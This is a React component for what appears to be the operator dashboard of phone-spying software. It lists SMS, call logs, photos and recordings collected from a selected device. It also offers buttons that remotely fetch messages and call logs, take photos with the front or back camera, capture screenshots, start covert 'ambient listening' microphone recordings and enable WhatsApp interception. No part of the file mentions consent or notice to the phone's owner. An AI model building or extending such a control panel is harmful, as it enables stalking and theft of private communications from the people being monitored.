import React from 'react';
import { Bell, Camera, Image as ImageIcon, MessageSquare, Mic, PhoneCall, RefreshCw, Smartphone } from 'lucide-react';
import { useDashboard } from '../context/DashboardContext';

export default function OverviewPage() {
  const { activeDevice, db, micStatus, selectedDeviceId, sendCommand } = useDashboard();

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
      <div className="glass-panel" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ display: 'flex', gap: '20px', alignItems: 'center' }}>
          <div
            style={{
              width: '64px',
              height: '64px',
              borderRadius: '16px',
              background: 'rgba(6, 182, 212, 0.1)',
              display: 'flex',
              alignItems: 'center',
              justifyItems: 'center',
              justifyContent: 'center',
            }}
          >
            <Smartphone size={32} style={{ color: 'var(--accent-cyan)' }} />
          </div>
          <div>
            <h3 style={{ fontSize: '20px', fontWeight: '700' }}>{activeDevice?.deviceName}</h3>
            <div style={{ display: 'flex', gap: '12px', marginTop: '6px', fontSize: '13px', alignItems: 'center' }}>
              <span className={`badge ${activeDevice?.status === 'online' ? 'badge-online' : 'badge-offline'}`}>
                {activeDevice?.status}
              </span>
              <span style={{ color: 'var(--color-text-muted)' }}>ID: {selectedDeviceId}</span>
              <span style={{ color: 'var(--color-text-muted)' }}>
                Last Synced: {new Date(activeDevice?.lastSeen).toLocaleTimeString()}
              </span>
            </div>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '12px' }}>
          <button className="btn btn-outline" onClick={() => sendCommand('FETCH_SMS')}>
            <RefreshCw size={14} /> Sync SMS
          </button>
          <button className="btn btn-outline" onClick={() => sendCommand('FETCH_CALL_LOGS')}>
            <RefreshCw size={14} /> Sync Calls
          </button>
        </div>
      </div>

      <div className="metrics-grid">
        <div className="glass-panel metric-card">
          <div className="metric-icon-box" style={{ background: 'rgba(6, 182, 212, 0.1)' }}>
            <MessageSquare size={24} style={{ color: 'var(--accent-cyan)' }} />
          </div>
          <div className="metric-info">
            <h4>Total SMS</h4>
            <p>{db.sms.filter(item => item.device_id === selectedDeviceId).length}</p>
          </div>
        </div>

        <div className="glass-panel metric-card">
          <div className="metric-icon-box" style={{ background: 'rgba(245, 158, 11, 0.1)' }}>
            <PhoneCall size={24} style={{ color: 'var(--accent-amber)' }} />
          </div>
          <div className="metric-info">
            <h4>Call Logs</h4>
            <p>{db.call_logs.filter(item => item.device_id === selectedDeviceId).length}</p>
          </div>
        </div>

        <div className="glass-panel metric-card">
          <div className="metric-icon-box" style={{ background: 'rgba(139, 92, 246, 0.1)' }}>
            <ImageIcon size={24} style={{ color: 'var(--accent-violet)' }} />
          </div>
          <div className="metric-info">
            <h4>Photos & Screens</h4>
            <p>{db.photos.filter(item => item.device_id === selectedDeviceId).length}</p>
          </div>
        </div>

        <div className="glass-panel metric-card">
          <div className="metric-icon-box" style={{ background: 'rgba(244, 63, 94, 0.1)' }}>
            <Mic size={24} style={{ color: 'var(--accent-rose)' }} />
          </div>
          <div className="metric-info">
            <h4>Recordings</h4>
            <p>{db.recordings.filter(item => item.device_id === selectedDeviceId).length}</p>
          </div>
        </div>
      </div>

      <div className="glass-panel">
        <h3 style={{ marginBottom: '16px', fontSize: '18px', fontWeight: '700' }}>Remote Control Panel</h3>
        <p style={{ color: 'var(--color-text-muted)', fontSize: '14px', marginBottom: '24px' }}>
          Send direct command triggers to the phone. Ensure the device is Online.
        </p>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '20px' }}>
          <div style={{ padding: '20px', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '12px', background: 'rgba(255,255,255,0.01)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px' }}>
              <Camera size={20} style={{ color: 'var(--accent-cyan)' }} />
              <h4 style={{ fontSize: '15px' }}>Camera Capture</h4>
            </div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <button className="btn btn-primary" style={{ flex: 1 }} onClick={() => sendCommand('TAKE_PHOTO', { camera: 'back' })}>
                Back Cam
              </button>
              <button className="btn btn-outline" style={{ flex: 1 }} onClick={() => sendCommand('TAKE_PHOTO', { camera: 'front' })}>
                Front Cam
              </button>
            </div>
          </div>

          <div style={{ padding: '20px', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '12px', background: 'rgba(255,255,255,0.01)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px' }}>
              <Smartphone size={20} style={{ color: 'var(--accent-violet)' }} />
              <h4 style={{ fontSize: '15px' }}>Display Control</h4>
            </div>
            <button className="btn btn-primary" style={{ width: '100%' }} onClick={() => sendCommand('TAKE_SCREENSHOT')}>
              Take Screenshot
            </button>
          </div>

          <div style={{ padding: '20px', border: `1px solid ${micStatus[selectedDeviceId] === 'recording' ? 'rgba(244,63,94,0.5)' : 'rgba(255,255,255,0.05)'}`, borderRadius: '12px', background: micStatus[selectedDeviceId] === 'recording' ? 'rgba(244,63,94,0.07)' : 'rgba(255,255,255,0.01)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px' }}>
              <Mic size={20} style={{ color: 'var(--accent-rose)' }} />
              <h4 style={{ fontSize: '15px' }}>Ambient Listening</h4>
              {micStatus[selectedDeviceId] === 'recording' && (
                <span
                  style={{
                    marginLeft: 'auto',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px',
                    background: 'rgba(244,63,94,0.15)',
                    border: '1px solid rgba(244,63,94,0.5)',
                    borderRadius: '20px',
                    padding: '3px 10px',
                    fontSize: '11px',
                    fontWeight: '700',
                    color: 'var(--accent-rose)',
                    animation: 'pulse-rose 1.5s infinite',
                  }}
                >
                  <span style={{ width: '7px', height: '7px', borderRadius: '50%', background: 'var(--accent-rose)', display: 'inline-block', animation: 'pulse-rose 1.5s infinite' }} />
                  REC LIVE
                </span>
              )}
            </div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <button className="btn btn-danger" style={{ flex: 1 }} onClick={() => sendCommand('START_RECORDING')}>
                {micStatus[selectedDeviceId] === 'recording' ? 'Recording...' : 'Start Recording'}
              </button>
              <button className="btn btn-outline" style={{ flex: 1 }} onClick={() => sendCommand('STOP_RECORDING')}>
                {micStatus[selectedDeviceId] === 'recording' ? 'Stop & Sync' : 'Stop Recording'}
              </button>
            </div>
          </div>

          <div style={{ padding: '20px', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '12px', background: 'rgba(255,255,255,0.01)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px' }}>
              <Bell size={20} style={{ color: 'var(--accent-amber)' }} />
              <h4 style={{ fontSize: '15px' }}>Access listeners</h4>
            </div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <button className="btn btn-outline" style={{ flex: 1 }} onClick={() => sendCommand('WHATSAPP_START')}>
                Enable WA
              </button>
              <button className="btn btn-outline" style={{ flex: 1 }} onClick={() => sendCommand('WHATSAPP_STOP')}>
                Disable WA
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
